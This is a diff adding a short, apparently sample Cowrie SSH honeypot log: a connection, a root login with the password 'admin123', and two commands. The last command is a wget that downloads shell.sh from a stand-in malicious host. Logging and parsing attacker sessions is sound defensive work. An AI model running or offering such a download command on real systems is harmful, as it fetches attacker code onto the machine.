@@ -1,0 +1,4 @@
+﻿{"eventid":"cowrie.session.connect","timestamp":"2024-01-15T10:30:00.000000Z","src_ip":"192.168.1.100","src_port":45678,"dst_ip":"10.0.0.5","dst_port":22,"session":"a1b2c3d4","protocol":"ssh","message":"New connection"}
+{"eventid":"cowrie.login.success","timestamp":"2024-01-15T10:30:15.000000Z","src_ip":"192.168.1.100","username":"root","password":"admin123","session":"a1b2c3d4","message":"login attempt"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-15T10:30:20.000000Z","src_ip":"192.168.1.100","input":"ls -la","session":"a1b2c3d4","message":"CMD: ls -la"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-15T10:30:25.000000Z","src_ip":"192.168.1.100","input":"wget http://malicious.com/shell.sh","session":"a1b2c3d4","message":"CMD: wget http://malicious.com/shell.sh"}
